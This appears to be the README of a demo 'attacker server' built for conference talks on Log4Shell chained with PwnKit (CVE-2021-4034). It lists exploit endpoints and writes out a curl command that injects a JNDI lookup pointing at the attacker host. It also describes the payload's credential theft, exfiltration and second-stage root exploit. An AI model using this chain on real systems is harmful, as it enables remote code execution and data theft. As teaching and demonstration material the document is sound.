# 🎯 Callback Server

A Spring Boot application that acts as a local "attacker server" for security demos.
It provides:
- **HTTP callback catcher** — logs all incoming requests (proves JNDI/SSRF callbacks)
- **LDAP exploit server** (port 1389) — serves JNDI references for Log4Shell RCE
- **Exploit payload hosting** — serves malicious `.class` files and shell scripts
- **Live dashboard** — auto-refreshing HTML page for conference projectors

## Run

```bash
cd "Callback Server"
../mvnw spring-boot:run
```

Or with Docker Compose (from the Vulnerable Application Old Java directory):

```bash
cd "Vulnerable Application Old Java"
docker compose up callback
```

## Ports

| Port | Service |
|------|---------|
| 9999 | HTTP (callbacks, dashboard, exploit payloads) |
| 1389 | LDAP (malicious JNDI references for Log4Shell) |

## Endpoints

| URL | Purpose |
|-----|---------|
| `http://localhost:9999/dashboard/live` | Live HTML dashboard (auto-refreshes) |
| `http://localhost:9999/dashboard` | JSON API — all received callbacks |
| `DELETE http://localhost:9999/dashboard` | Clear callback history |
| `http://localhost:9999/exploit/ExploitPayload.class` | Malicious class loaded via JNDI |
| `http://localhost:9999/exploits/pwnkit.c` | PwnKit exploit source (CVE-2021-4034) |
| `http://localhost:9999/exploits/pwnkit.sh` | PwnKit auto-exploit shell script |
| `ldap://localhost:1389/pwnkit` | LDAP reference → triggers class loading |

## Full Attack Chain

```bash
# ONE curl command triggers the entire chain:
curl "http://victim:8080/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"

# What happens:
# 1. Log4j does JNDI lookup → connects to LDAP server (port 1389)
# 2. LDAP server responds with reference to ExploitPayload.class
# 3. Victim downloads the class from the HTTP server (port 9999); its static
#    initializer runs automatically → recon + credential/env-var theft +
#    exfiltration to this server, all logged in the victim's own container log
# 4. If the victim process is already root (Dockerfile.root), nothing more to
#    escalate. If it's running as a non-root user with `pkexec` + `gcc`
#    present (Dockerfile.escalation), the payload fetches and runs
#    /exploits/pwnkit.sh from this server as a second stage — an attempt at
#    CVE-2021-4034, not a guaranteed win. Whether it works depends entirely on
#    whether the target's policykit-1 package is patched; against a current
#    apt mirror it will correctly report failure, which is itself the point:
#    the OS package layer, not just the Java library, has to be out of date.
```

## Conference Presentation

1. Start the callback server (Docker Compose or standalone)
2. Open `http://localhost:9999/dashboard/live` on the projector
3. Run the exploit curl command — audience sees the full chain unfold in real-time
